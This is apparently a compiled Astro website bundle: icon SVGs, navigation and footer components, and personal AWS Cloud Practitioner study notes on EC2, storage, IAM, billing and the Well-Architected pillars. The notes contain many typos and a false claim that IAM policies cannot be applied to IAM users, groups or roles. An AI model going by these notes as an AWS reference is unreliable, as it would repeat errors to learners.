stroke-linejoin="round" stroke-width="16" d="M128 88c0-22 18.5-40.3 40.5-40a40 40 0 0 1 36.2 24H240l-32.3 32.3A127.9 127.9 0 0 1 80 224c-32 0-40-12-40-12s32-12 48-36c0 0-64-32-48-120 0 0 40 40 88 48Z"/>',"codepen-logo":'<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="m232 101-104 59-104-59 100.1-56.8a8.3 8.3 0 0 1 7.8 0Z"/><path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="m232 165-100.1 56.8a8.3 8.3 0 0 1-7.8 0L24 165l104-59Zm0-64v64M24 101v64m104-5v62.8m0-179.6V106"/>',"github-logo":'<g stroke-linecap="round" stroke-linejoin="round"><path fill="none" stroke-width="14.7" d="M55.7 167.2c13.9 1 21.3 13.1 22.2 14.6 4.2 7.2 10.4 9.6 18.3 7.1l1.1-3.4a60.3 60.3 0 0 1-25.8-11.9c-12-10.1-18-25.6-18-46.3"/><path fill="none" stroke-width="16" d="M61.4 205.1a24.5 24.5 0 0 1-3-6.1c-3.2-7.9-7.1-10.6-7.8-11.1l-1-.6c-2.4-1.6-9.5-6.5-7.2-13.9 1.4-4.5 6-7.2 12.3-7.2h.8c4 .3 7.6 1.5 10.7 3.2-9.1-10.1-13.6-24.3-13.6-42.3 0-11.3 3.5-21.7 10.1-30.4A46.7 46.7 0 0 1 65 67.3a8.3 8.3 0 0 1 5-4.7c2.8-.9 13.3-2.7 33.2 9.9a105 105 0 0 1 50.5 0c19.9-12.6 30.4-10.8 33.2-9.9 2.3.7 4.1 2.4 5 4.7 5 12.7 4 23.2 2.6 29.4 6.7 8.7 10 18.9 10 30.4 0 42.6-25.8 54.7-43.6 58.7 1.4 4.1 2.2 8.8 2.2 13.7l-.1 23.4v2.3"/><path fill="none" stroke-width="16" d="M160.9 185.7c1.4 4.1 2.2 8.8 2.2 13.7l-.1 23.4v2.3A98.6 98.6 0 1 0 61.4 205c-1.4-2.1-11.3-17.5-11.8-17.8-2.4-1.6-9.5-6.5-7.2-13.9 1.4-4.5 6-7.2 12.3-7.2h.8c4 .3 7.6 1.5 10.7 3.2-9.1-10.1-13.6-24.3-13.6-42.3 0-11.3 3.5-21.7 10.1-30.4A46.4 46.4 0 0 1 65 67.3a8.3 8.3 0 0 1 5-4.7c2.8-.9 13.3-2.7 33.2 9.9a105 105 0 0 1 50.5 0c19.9-12.6 30.4-10.8 33.2-9.9 2.3.7 4.1 2.4 5 4.7 5 12.7 4 23.2 2.6 29.4 6.7 8.7 10 18.9 10 30.4.1 42.6-25.8 54.7-43.6 58.6z"/><path fill="none" stroke-width="18.7" d="m170.1 203.3 17.3-12 17.2-18.7 9.5-26.6v-27.9l-9.5-27.5" /><path fill="none" stroke-width="22.7" d="m92.1 57.3 23.3-4.6 18.7-1.4 29.3 5.4m-110 32.6-8 16-4 21.4.6 20.3 3.4 13" /><path fill="none" stroke-width="13.3" d="M28.8 133a100 100 0 0 0 66.9 94.4v-8.7c-22.4 1.8-33-11.5-35.6-19.8-3.4-8.6-7.8-11.4-8.5-11.8"/></g>',"twitch-logo":'<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M165 200h-42a8 8 0 0 0-5 2l-46 38v-40H48a8 8 0 0 1-8-8V48a8 8 0 0 1 8-8h160a8 8 0 0 1 8 8v108a8 8 0 0 1-3 6l-43 36a8 8 0 0 1-5 2Zm3-112v48m-48-48v48"/>',"youtube-logo":'<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="m160 128-48-32v64l48-32z"/><path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M24 128c0 30 3 47 5 56a16 16 0 0 0 10 11c34 13 89 13 89 13s56 0 89-13a16 16 0 0 0 10-11c2-9 5-26 5-56s-3-47-5-56a16 16 0 0 0-10-11c-33-13-89-13-89-13s-55 0-89 13a16 16 0 0 0-10 11c-2 9-5 26-5 56Z"/>',"dribbble-logo":'<circle cx="128" cy="128" r="96" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"/><path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M71 205a160 160 0 0 1 137-77l16 1m-36-76a160 160 0 0 1-124 59 165 165 0 0 1-30-3"/><path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M86 42a161 161 0 0 1 74 177"/>',"linkedin-logo":'<rect width="256" height="256" fill="none"></rect><rect x="36" y="36" width="184" height="184" rx="8" fill="none" stroke="#000000" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></rect><line x1="120" y1="112" x2="120" y2="176" fill="none" stroke="#000000" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></line><line x1="88" y1="112" x2="88" y2="176" fill="none" stroke="#000000" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></line><path d="M120,140a28,28,0,0,1,56,0v36" fill="none" stroke="#000000" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></path><circle cx="88" cy="80" r="12"></circle>'},Or=P(),H=B(async(e,n,a)=>{let t=e.createAstro(Or,n,a);t.self=H;let{color:o="currentcolor",gradient:s,icon:i,size:l}=t.props,c=_r[i],u={};l&&(u.style={"--size":l});let r="icon-gradient-"+Math.round(Math.random()*1e13).toString(36);return h`${z()}<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 256 256" aria-hidden="true"${T(s?`url(#${r})`:o,"stroke")}${ve(u,"attrs",{class:"astro-PATNJMLL"})}>
  <g class="astro-PATNJMLL">${ge(c)}</g>
  ${s&&h`<linearGradient${T(r,"id")} x1="23" x2="235" y1="43" y2="202" gradientUnits="userSpaceOnUse" class="astro-PATNJMLL">
        <stop stop-color="var(--gradient-stop-1)" class="astro-PATNJMLL"></stop>
        <stop offset=".5" stop-color="var(--gradient-stop-2)" class="astro-PATNJMLL"></stop>
        <stop offset="1" stop-color="var(--gradient-stop-3)" class="astro-PATNJMLL"></stop>
      </linearGradient>`}
</svg>`},"/Users/darth/Desktop/portfolio-website/src/components/Icon.astro",void 0),Nr=P(),no=B(async(e,n,a)=>{let t=e.createAstro(Nr,n,a);return t.self=no,h`${f(e,"theme-toggle","theme-toggle",{class:"astro-X3PJSKD3"},{default:()=>h`
	${z()}<button class="astro-X3PJSKD3">
		<span class="sr-only astro-X3PJSKD3">Dark theme</span>
		<span class="icon light astro-X3PJSKD3">${f(e,"Icon",H,{icon:"sun",class:"astro-X3PJSKD3"})}</span>
		<span class="icon dark astro-X3PJSKD3">${f(e,"Icon",H,{icon:"moon-stars",class:"astro-X3PJSKD3"})}</span>
	</button>
`})}`},"/Users/darth/Desktop/portfolio-website/src/components/ThemeToggle.astro",void 0),Ur=P(),ao=B(async(e,n,a)=>{let t=e.createAstro(Ur,n,a);t.self=ao;let o=[{label:"Home",href:"/"},{label:"About",href:"/about/"},{label:"Blog",href:"https://blog.assan.xyz"}],s=[{label:"Twitter",href:"https://twitter.com/darth_assan",icon:"twitter-logo"},{label:"GitHub",href:"https://github.com/darth-assan",icon:"github-logo"}];return h`${z()}<nav class="astro-DMQPWCEC">
  <div class="menu-header astro-DMQPWCEC">
    <a href="/" class="site-title astro-DMQPWCEC">
      ${f(e,"Icon",H,{icon:"terminal-window",color:"var(--accent-regular)",size:"1.6em",gradient:!0,class:"astro-DMQPWCEC"})}
      David Arthur [Assan]
    </a>
    ${f(e,"menu-button","menu-button",{class:"astro-DMQPWCEC"},{default:()=>h`
      <template class="astro-DMQPWCEC">
        <button class="menu-button astro-DMQPWCEC" aria-expanded="false">
          <span class="sr-only astro-DMQPWCEC">Menu</span>
          ${f(e,"Icon",H,{icon:"list",class:"astro-DMQPWCEC"})}
        </button>
      </template>
    `})}
  </div>
  <div id="menu-content" class="astro-DMQPWCEC">
    <ul class="nav-items astro-DMQPWCEC">
      ${o.map(({label:i,href:l})=>h`<li class="astro-DMQPWCEC">
            <a${T(t.url.pathname===l,"aria-current")}${T([["link",{active:t.url.pathname===l||l!=="/"&&t.url.pathname.startsWith(l)}],"astro-DMQPWCEC"],"class:list")}${T(l,"href")}>
              ${i}
            </a>
          </li>`)}
    </ul>
    <div class="menu-footer astro-DMQPWCEC">
      <div class="socials astro-DMQPWCEC">
        ${s.map(({href:i,icon:l,label:c})=>h`<a${T(i,"href")} class="social astro-DMQPWCEC">
              <span class="sr-only astro-DMQPWCEC">${c}</span>
              ${f(e,"Icon",H,{icon:l,class:"astro-DMQPWCEC"})}
            </a>`)}
      </div>

      <div class="theme-toggle astro-DMQPWCEC">
        ${f(e,"ThemeToggle",no,{class:"astro-DMQPWCEC"})}
      </div>
    </div>
  </div>
</nav>`},"/Users/darth/Desktop/portfolio-website/src/components/Nav.astro",void 0),Gr=P(),oo=B(async(e,n,a)=>{let t=e.createAstro(Gr,n,a);t.self=oo;let o=new Date().getFullYear();return h`${z()}<footer class="astro-SZ7XMLTE">
  <div class="group astro-SZ7XMLTE">
    <p class="astro-SZ7XMLTE">&copy; ${o} David Arthur [Assan]</p>
  </div>
  <p class="socials astro-SZ7XMLTE">
    <a href="https://linkedin.com/in/darth-assan" class="astro-SZ7XMLTE"> LinkedIn</a>
    <a href="https://twitter.com/darthassan" class="astro-SZ7XMLTE"> Twitter</a>
    <a href="https://github.com/darth-assan" class="astro-SZ7XMLTE"> GitHub</a>
  </p>
</footer>`},"/Users/darth/Desktop/portfolio-website/src/components/Footer.astro",void 0),qr=P(),X=B(async(e,n,a)=>{let t=e.createAstro(qr,n,a);t.self=X;let{title:o,description:s}=t.props;return h`<html lang="en" class="astro-37FXCHFA">
  <head>
    ${f(e,"MainHead",to,{title:o,description:s,class:"astro-37FXCHFA"})}
  ${Wa()}</head>
  <body class="astro-37FXCHFA">
    <div class="stack backgrounds astro-37FXCHFA">
      ${f(e,"Nav",ao,{class:"astro-37FXCHFA"})}
      ${ne(e,a.default)}
      ${f(e,"Footer",oo,{class:"astro-37FXCHFA"})}
    </div>

    

    
  </body>
</html>`},"/Users/darth/Desktop/portfolio-website/src/layouts/BaseLayout.astro",void 0),Kr=P(),ee=B(async(e,n,a)=>{let t=e.createAstro(Kr,n,a);t.self=ee;let{align:o="center",tagline:s,title:i}=t.props;return h`${z()}<header${T([["hero stack gap-4",o],"astro-BBE6DXRZ"],"class:list")}>
	<div class="stack gap-2 astro-BBE6DXRZ">
		<h1 class="title astro-BBE6DXRZ">${i}</h1>
		${s&&h`<p class="tagline astro-BBE6DXRZ">${s}</p>`}
	</div>
	${ne(e,a.default)}
</header>`},"/Users/darth/Desktop/portfolio-website/src/components/Hero.astro",void 0),Vr=P(),be=B(async(e,n,a)=>{let t=e.createAstro(Vr,n,a);return t.self=be,h`${z()}<div class="pill astro-2QEYWK4B">${ne(e,a.default)}</div>`},"/Users/darth/Desktop/portfolio-website/src/components/Pill.astro",void 0),Zr=P(),so=B(async(e,n,a)=>{let t=e.createAstro(Zr,n,a);return t.self=so,h`${f(e,"BaseLayout",X,{title:"Not Found",description:"404 Error \u2014 this page was not found",class:"astro-ZETDM5MD"},{default:o=>h`
  ${f(o,"Hero",ee,{title:"Page Not Found",tagline:"Let's go home",class:"astro-ZETDM5MD"})}
  ${z()}<a href="/" class="roles astro-ZETDM5MD">
    ${f(o,"Pill",be,{class:"astro-ZETDM5MD"},{default:s=>h`${f(s,"Icon",H,{icon:"arrow-left",size:"1.33em",class:"astro-ZETDM5MD"})}Home`})}
  </a>
`})}`},"/Users/darth/Desktop/portfolio-website/src/pages/404.astro",void 0),Jr="/Users/darth/Desktop/portfolio-website/src/pages/404.astro",Yr="/404",Qr=Object.freeze(Object.defineProperty({__proto__:null,default:so,file:Jr,url:Yr},Symbol.toStringTag,{value:"Module"}))});var ro={};$(ro,{_internal:()=>ol,body:()=>nl,collection:()=>el,data:()=>al,id:()=>Xr,slug:()=>tl});var Xr,el,tl,nl,al,ol,lo=F(()=>{Xr="aws-cpp.md",el="work",tl="aws-cpp",nl=`
### Scaling Amazon EC2

Scaling involves begining with only the resources you need and design your architecture to automatically respond to changing demand by scaling out or in

- Horizontal Scaling - Auto scaling
- Scaling up - Adding more power to the machines that's running
- Scaling out - Adding more instances

**Dynamic scaling**: respond to changing demand.

**Predictive scaling**: automatically schedules the right number of Amazon EC2 instances based on predictive demand.

**\u26A0\uFE0F NOTE: To scale faster you have to use both.**
If you do not specify the desired number of Amazon EC2 instances in Auto Scaling Group, the desired capacity degaults to the minimum capacity.

---

### AWS services and features

**Analytics:**

- Amazon Athena
- Amazon Kinesis
- Amazon QuickSight

**Application Integration:**

- Amazon Simple Notification Service (Amazon SNS)
- Amazon Simple Queue Service (Amazon SQS)

**Compute and Serverless:**

- AWS Batch
- Amazon EC2
- AWS Elastic Beanstalk
- AWS Lambda
- Amazon Lightsail
- Amazon WorkSpaces

**Containers:**

- Amazon Elastic Container Service (Amazon ECS)
- Amazon Elastic Kubernetes Service (Amazon EKS)
- AWS Fargate

**Database:**

- Amazon Aurora
- Amazon DynamoDB
- Amazon ElastiCache
- Amazon RDS
- Amazon Redshift

**Developer Tools:**

- AWS CodeBuild
- AWS CodeCommit
- AWS CodeDeploy
- AWS CodePipeline
- AWS CodeStar

**Customer Engagement:**

- Amazon Connect

**Management, Monitoring, and Governance:**

- AWS Auto Scaling
- AWS Budgets
- AWS CloudFormation
- AWS CloudTrail
- Amazon CloudWatch
- AWS Config
- AWS Cost and Usage Report
- Amazon EventBridge (Amazon CloudWatch Events)
- AWS License Manager
- AWS Managed Services
- AWS Organizations
- AWS Secrets Manager
- AWS Systems Manager
- AWS Systems Manager Parameter Store
- AWS Trusted Advisor

**Networking and Content Delivery:**

- Amazon API Gateway
- Amazon CloudFront
- AWS Direct Connect
- Amazon Route 53
- Amazon VPC

**Security, Identity, and Compliance:**

- AWS Artifact
- AWS Certificate Manager (ACM)
- AWS CloudHSM
- Amazon Cognito
- Amazon Detective
- Amazon GuardDuty
- AWS Identity and Access Management (IAM)
- Amazon Inspector
- AWS License Manager
- Amazon Macie
- AWS Shield
- AWS WAF

**Storage:**

- AWS Backup
- Amazon Elastic Block Store (Amazon EBS)
- Amazon Elastic File System (Amazon EFS)
- Amazon S3
- Amazon S3 Glacier
- AWS Snowball Edge
- AWS Storage Gateway

---

### The Cloud

An EC2 instance is a virtual server in the AWS client-server module.

> You only pay for what you use.

Cloud computing is the on-demand delivery of IT resouces over the internet with pay-as-you-go pricing.

- Undifferentiated heavy lifting of IT: Tasks that are common, repetitive and time consuming. AWS focuses on this so you get the time to do what you need to do.
- Over the internet
- Pay-as-you-go pricing.

---

### Cloud Deployment

- Cloud-based Deployment: Run all parts of the application in the cloudl
- On-Premises Deployment: Deploy resources using virtualization and resources as well as management tools.
- Hybrid Deployment: Connect cloud based resources to on-premises (infrastructure)

**Benefits of the Cloud**

1. Trade upfront expenses for variable expenses
2. Stop spending money to run and maintain data centers.
3. Stop guessing capacity
4. Benefit from massive economics of scale (Lower pay-as-you-go prices)
5. Increase speed and agility
6. Go global in minutes.

---

### Elastic Compute Cloud (Amazon EC2)

Highly flexible -> Cost effective -> Quick

Launch -> Connect -> Use

- Runs on physical host machines
- Uses virtualization technology to deliver it to you.
- Share the resources
- Resizeable (Virtual Scaling)
- Networking is managed by you.
- Compute as a Service

**You have complete control of the instance**

**Multitenancy**: Sharing underlying hardware between virtual machines

> When you are using EC2, you are responsible for software patches /setting up scaling / High availabiligy

---

### Types of EC2 Instances

Each instace type is grouped under an instance family.

1. General Purpose: Good balance of compute/CPU and memory resources - Web servers and code repositories
2. Compute Optimized: Compute instensive task - HPC/Gaming servers/scientific modelling.
3. Memory Optimized: Memory intense tasks
4. Accelerated Computing: Floating point number calculator / Graphic processing
5. Storage Optimized: High performance for locally stored data

**EC2 Pricing**

1. On-demand: Only pay for the duration you your instance runs for.
2. Saving plan: USD 1 / hr - 1/3 year term commitment - 72% savings
3. Reserved Instance: Discount on 1/3 year term. Offers Upfront, No upfront and portion payment to enjoy 75% discount
4. Spot Instances: Spare EC2 instances - 90% discount. AWS can reclaim the instance anytime while giving you 2 minutes warning. No contracts needed.
5. Dedicated Host: Pysically host dedicated EC2. Used for meeting compliance requirements and no one will share tenancy of the host.

**Directing Trafic with Elastic Load Balancing**

- Properly distribute traffic in high performance / cost efficient / highly available and automatically scalable.
- ELB is a regional construct
- Helps in a decoupled architechture

**Global Infrastructure and Reliability**

It is not good enough to have all your data stored in a single data centre. You need high availability and fault tolerance.

- AWS Region: Region is made up of multiple data centers. Regions are geographically isolated areas.
- A single/group of data centers is called an availability zone. Each AZ is one or more discrete data center with redandancy power, networking and connectivity.
  For high availability, you have to run across at least two availability zones in a region.

> Regional Construct

1. SNS
2. SQS
3. S3
4. EFS

### Edge Locations

CDN - Content Delivery Network. Caching a coppy close to the customer/user. **Cloudfront** is amazon's CDN.

**Cloudfront**
: uses edge locations to help accelerate communications.

**Amazon Route53**
: Is a DNS server that can also be run on the edge location

**AWS Outposts**
: Using AWS inside your own building (Data Center)

> In AWS, everything is an API call

---

#### Managing AWS Resources

- AWS Management Console
- AWS Commandline Interface (CLI)
- AWS Software Development Kits (SDKs)

**AWS Elastic Beanstalk**
: Helps you provision Amazon EC2 based environments

**AWS CloudFormation**
: Infrastructure as code tool. It is a declarative way using JSON or YAML. Supports more than Just EC2 instances.

---

### Messaging and Queueing

- puting a message into a buffer.
- Tightly coupled (When an application communicates directly with other processess)
- Loosely coupled (Single failure won't couse cascading failures)

_Amazon Simple Queue Service (Amazon SQS)_

_Amazon Simple Notification Service (Amazon SNS)_

| SQS                                                                                       | SNS                                              |
| ----------------------------------------------------------------------------------------- | ------------------------------------------------ |
| Send messages, Store messages, Receive messages between software component at any volume. | Publish/Subscribe module. Make use of SNS topics |

---

### Migration and Innovation

The AWS cloud adoption framework (AWS CAF) - organises guidance into six areas of focus that's call perspective.

Focus: Business Capabilities

1. Business Perspective
2. People Perspective
3. Governance Perspective

Focus: Platform Capalilities

4. Platform Perspective
5. Security Perspective
6. Operations Perspective

**Migration Strategies**

The six R's of Migration

- Rehosting - Lift and shift
- Replatforming - Lift tinker shift
- Retire
- Retain
- Repurchasing
- Refactoring / re-achitecting

---

### AWS Snow Family

- AWS Snow Cone - 8TB
- AWS Snowball Edge
  - Compute Optimized (Storage 42TB / 52 VCPUs)
  - Storage Optimized (Storage 80TB / 40 VCPUs)
- AWS Snow mobile - 100PB

---

### Innovatoin with AWS

- Vmware on AWS
- Amazon SageMaker
- Amazon Augmented AI
- Amazon Lex
- Amazon Textract
- AWS DeepRacer
- AWS Ground Station

### Monitoring and Analytics

**Amazon Cloudwatch**
: It's a {graphical dashboard}. It's a web service that enables you to monitor and manage various metrics and configure alarm actions based on data from those metrics.

**AWS Cloud Trail**
: {Logs}. Trust but verify. API auditing tool. Every request gets logged in the cloud Trail engine.

**AWS Trusted Advisor**
: {Auditing} Is a web service that inspects your AWS environment and provides real-time recommendations in accordance with AWS best practices.

###### BEST PRACTICES

1.  Cost Optimization
2.  Fault Tolerance
3.  Performance
4.  Security
5.  Service Limits

---

### Networking

Amazon Virtual Private Cloud (VPC): It's a private network in AWS. Allows you to provision a logically isolated section of the AWS cloud where you can launch AWS resources in a virtual network that you define. The resource can be public subnet or private network.

**Internet Gateway**
: Allows traffic to access your VPC

**Private Gateway**
: allows you to create a VPN to your VPC

**AWS Direct Connect**
: Allows you to establish a completely private, dedicated fiber connection from your data center to AWS.

| Network Access Control List (NACL)                                               | Security Group                                                                                                          |
| -------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| Stateless                                                                        | Stateful                                                                                                                |
| Applies to all instances within a subnet                                         | Determines what trafic comes in(inboud traffic) to the instance and which one leaves(outbound traffic) the EC2 instance |
| Operates at the subnet level                                                     | Operates at the Elastic Network Interface (ENI)                                                                         |
| NACL rules are evaluated from Lowest to Highest. Lowest number, Highest priority | It's a virtual firewall                                                                                                 |
| Both Allow and Deny rules are possible                                           | Only have allow rules                                                                                                   |
| Allows all traffic by default                                                    | Blocks all traffic by default                                                                                           |

---

### Pricing and Support

AWS Free Tier

- Always free
- 12 months free
- Trials

**AWS Lambda**
: Free for 1 million invocations per month.

**S3**
: is free for 12 months

**Lightsail**
: Offers 1 month trial of up to 750 hours of usage

| Pay for what you use                                                                                                                              | Pay less when you reserve                                                                                          | Pay less with volume-based discounts when you use more                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------- |
| For each service, you pay for exactly the amount of resources that you actually use, without requiring long-term contaracts or complex licensing. | Some Service offer reservation options that provides a significant discount compared to on-demand instance pricing | Some service offer tiered pricing, so the per-unit cost is incrementally lower with increased usage |

---

### Billing

**AWS Billing and cost Management Dashboard**
: to pay your AWS bill, monitor your usage analyze and control your costs.

- compare your current month-to-date balace with the previous month, and get a forcast of the next month based on current usage.
- View month-to-date spend by service
- View free tier usage by service
- Access cost Explorer and Create budget
- Purchase and mange savings plans
- Publish AWS costs and usage reports

**Consolidated Billing**
: Enables you to receivea single bill for all AWS accounts in your organisation.

- By consolidating you can easily track the combined costs of all th linked accounts in your organisation.
- Another benefit of consolidated billing is the ability to share bulk discount pricing, savings plans, and reserved instances across the accounts in your organisation.

**AWS Budget**
: You can create budgets to plan your service usage, service costs and instance reservations.

**AWS Cost Explorer**
: Is a tool that enables you to visualize, understand and manage your AWS costs and usage over time.

**AWS Support Plans**
: AWS offrs four different support plans to meet your company's needs.

1. Basic Plan - Free and limited trusted adviser checks.
2. Developer Plan
3. Business Plan
4. Enterprse Plan - TAM

**AWS Market Place**
: It's a digital catalog that includes thousands of software listings from independent software vendors. You can use AWS marketplace to find, test and buy software that runs on AWS.

---

### Security

With the shared responsibility model

- AWS controls the Security of the cloud
- Customers controls the Security in the cloud

| Customer                                           | AWS                                                                                                                                                      |
| -------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Security in the Cloud                              | Security of the Cloud                                                                                                                                    |
| Maintains control over your content                | Operates, manages and control the components at all layers of infrasture including (Host OS, Virtualization Layer, Physical Security of the Data Center) |
| Managing security requirements                     | Global infrastructure                                                                                                                                    |
| Access to content                                  |                                                                                                                                                          |
| how access rights are granted, managed and revoked |                                                                                                                                                          |

**User Permissions and Access**

AWS identity and Access Management (IAM) - by default IAM users have no permissions.

**Least Privilege Principle**
: A user is granted access only to what they need.

**Root user**
: Has complete access to all the AWS services and resources in the account. Do not use the root user for everyday tasks.

- Create an AWS account this established your root user identity
- Create your first IAM user and give it permissions to create other users
- Login as the new IAM user and continue to create other users
- Only acccess the root user for a limitee number of tasks

**IAM Users**
: Is an identity that you create in AWS. It represents the person / application that interacts with AWS services and resources. Consist of names and credentials. - by default, when you create a new IAM user in AWS, it has no permissions associated with it.

> BEST PRACTICE

<mark>We recommend that you create individual IAM users for each person who needs to access AWS.</mark>

**IAM Policies**
: An IAM policy is a document that allows or denies permisions to AWS services and resoruces. Allows you to customize user level of access to resouces.

> BEST PRACTICE

<mark>Follow the security principles of least privilege when granting permission</mark>

**IAM Groups**
: Is a collection of IAM users. When you assign an IAM policy to a group, all users in the group are granted permissions specified by the policy. One way to manage your users and their permissoins is to organise them into IAM groups.

**IAM Roles**
: Is an identity that you can assume to gain temporary access to permissions. Before an IAM user, application or service can assume an IAM role, they must be granted permission to switch to the role. When someone assumes an IAM role, they drop all previous permissions they had under a previous role and assume the premission of the new role.

> BEST PRACTICE

<mark>IAM roles are ideal for situations in which access to services or resources needs to be granted temporarily instead of long-time.</mark>

**AWS Organizations**

A central location to mange multiple AWS accounts.

- Centralized management
- Consolidated billing
- Hierarchical groupings of accounts
- AWS service and API actions access control (Services control Policies(SCPs)).

<mark>You cannot apply IAM policies to IAM users, groups or roles. You cannnot apply an IAM policy to the AWS account root user.</mark>

**AWS Artifact**

Is a service that provides on-demand access to AWS security and compliance reports and select online agreements. AWS artifacts consists of two main sections:

- <mark>AWS Artifacts Agreements and AWS Artifact Reports</mark>

**Denial of Service Attacks**

- Security Policy can help against UDP Floods
- ELB can help against slow loris attacks
- <span style="color:red">AWS Shield is a service protects applications against DDoS attacks.</span>
- <span style="color:red">AWS WAF uses a web application firewall to filter incoming traffic with the signature of bad actors.</span>

**Additional Security Services**

**AWS Key Management Service (KMS)**
: is used to manage cryptographic/encryption keys on AWS

- Encryption at rest -> DynamoDB data
- Encrypton in transit -> SSL

**Amazon Inspector**
: runs automated security accessment against your infrastructure

**Amazon GuardDuty**
: It analyses contineous streams of metadata generated from your account and network activity.

---

### Serverless

You cannot see or access the underlying infrastructure.

AWS Lambda is a serverless option suited for quick processing like web application backend.

- AWS Container Services: Container orchestration tool.
- Amazon Elastic Container Service (Amazon ECS)
- Amazon Elastic Kubernetes Service (Amazon EKS)
- AWS Fargate: It is a serverless computer platformm for ECS and EKS

---

### Storage and Databases

<span style="color:orange">- Block level storage - Hard Drive</style>

**Instance Store**
: are used to store temporary files and data that can be easily recreated without consequences.

**Amazon Elastic Block Store (EBS)**
: Virtual hard drive or EBS volumes. Allows incremental backups called snapshots.

**Amazon Simple Storage Service (S3)**
: Store and retrieve unlimited amount of data. Stores data as an object in buckets with mazimum size of 5TB.

**Storage Types**

S3 Standard

- 99.99% at least 3 storage facilities

S3 Standard - Infrequent Access (S3 standard - IA)

- used for data accessed less frequently but requres rapid access when needded (Backups)

Amazon S3 Glacier

- used to achive data for auditing or future purposes

S3 one zone-Infrequent Access (S3 one zone-IA)

- stores data in a single AZ

S3 Intelligent-Tiering

- Ideal for data with ==unknown== or ==changeing access patterns.==

S3 Glacier Deep Archive

- Lowest-Cost object storage class ideal for archiving

**Amazon Elastic File System (Amazon EFS)**

It's a managed file system. Amazon takes care of the scaling andreplication of multiple instances accessing the data all the time. It's a true file system for Linux and not just a blank hard drive you can write to.

<mark>On-Premises servers can access Amazon EFS using AWS Direct Connect</mark>

**Amazon Relational Database Service (RDS)**

Lift-and-shift migration of databse in EC2 or use RDS to do the migration with added benefits which includes _automate patching_, _backups_, _redundancy_,_failovers_,_disaster recovery_

**Amazon Aurora**

Aurora is a managed relational database. Used for high availability. Entreprise class relational database.

- Pricing is 1/10th the cost of commercial databases.
- Data replicated across facilities 6 copies at any given time.
- Up to 15 read replicas
- Contineous backup to S3
- Point-in-time recovery

**Amazon DynamoDB**

It's a serverless database which supports auto scaling. Non-relational (NoSQL) which uses key-value pair

- Highly scalable and highly performant
- Purpose built.

**Amazon Redshift**

Data wearhousing service. Looks at historical analytics as suppose to operational analysis. It is scalable and offers data wear house as a service.

**Amazon Database Migeration Service (DMS)**

Migrates existing databse onto AWS in a secure fashion

**Amazon DocumentDB**

It's a document Database

**Amazon Neptune**

Used for Graph Databases

**Amazon Quantum Ledger Database (QLDB)**

All entries can never be deleted / removed from the audit

**Amazon ElasticCache**

Provides caching layers for DBS. Supports redis and memcached.

**Amazon DynamoDB Accelerator (DAX)**

**Imporoves read times for non-relational data**

---

### The Cloud Journey

AWS Well-Architected Framework: helps you understand how to design and operate reliable, secure, efficient and cost effective systems in the AWS cloud.

Operatoinal Experience

- Is the ability to run and monitor systems to deliver business value and to continually improve supporting processes and procedures.

Security

- The security pillar is the ability to protect information, systems and assets while delivering business value through risks assessments and mitigation strategies.

Reliability

- the ability of a system to do the following

- Recover from infrastructure or service desruption
- Dynamically acquire computing resources to meet demand
- Mitigate disruptions such as misconfigurations or transient network issues.

Performance Efficiency

- the ability to use computing resources efficiently to meet system requiremtns and to maintain that efficiency as demand changes and technology evolves.

Cost Optimization

- Is the ability to run systems to deliver business value at the lowest price point.

**Benefits of the cloud**

<mark>There are 6 main benefits of the cloud

1. Trade upfront expenses for variable expense
2. Benefit from massive economies of scale
3. Stop guessing capacity
4. Increase speed and agility
5. Stop spending money running and maintaining data centers
6. Go global in minutes</mark>

### AWS Well-Architected and the Six Pillars

**Framework Overview**

The AWS Well-Architected Framework describes key concepts, design principles, and architectural best practices for designing and running workloads in the cloud. By answering a few foundational questions, learn how well your architecture aligns with cloud best practices and gain guidance for making improvements.

**Operational Excellence Pillar**

The operational excellence pillar focuses on running and monitoring systems, and continually improving processes and procedures. Key topics include automating changes, responding to events, and defining standards to manage daily operations.

- Perfom Operations as code
- Make frequent,small reversible changes
- Refine operations procedures frequently
- Anticipate failure
- Learn from all operational failures

**Performance Efficiency Pillar**

The performance efficiency pillar focuses on structured and streamlined allocation of IT and computing resources. Key topics include selecting resource types and sizes optimized for workload requirements, monitoring performance, and maintaining efficiency as business needs evolve.

- Go global in minutes
- Use serverless architechures
- Experiment more often
- Democratize advanced technologies

**Security Pillar**

The security pillar focuses on protecting information and systems. Key topics include confidentiality and integrity of data, managing user permissions, and establishing controls to detect security events.

- Enable traceability
- Implement a strong indentity foundation
- Apply security at all layers
- Automate security best practices
- Keep people away from data
- Prepare for security events
- Protect data at rest and in transit

**Reliability Pillar**

The reliability pillar focuses on workloads performing their intended functions and how to recover quickly from failure to meet demands. Key topics include distributed system design, recovery planning, and adapting to changing requirements.

- Automatically recover from failure
- Test recovery procedures
- Scale horizontally to increase aggregated workload
- Stop guessing capacity
- Manage change in automation

**Cost Optimization Pillar**

The cost optimization pillar focuses on avoiding unnecessary costs. Key topics include understanding spending over time and controlling fund allocation, selecting resources of the right type and quantity, and scaling to meet business needs without overspending.

- Implement Cloud Financial Management
- Adopt a consumption model
- Measure overall efficiency
- Stop spending money on undifferentiated heavy lifting
- Analyze and attribute expenditure

**Sustainability Pillar**

The sustainability pillar focuses on minimizing the environmental impacts of running cloud workloads. Key topics include a shared responsibility model for sustainability, understanding impact, and maximizing utilization to minimize required resources and reduce downstream impacts.

---

### About the Exams

Cloud Concepts - 26%

Security and Compliance - 25%

Technology - 33%

Billing and Pricing - 16%

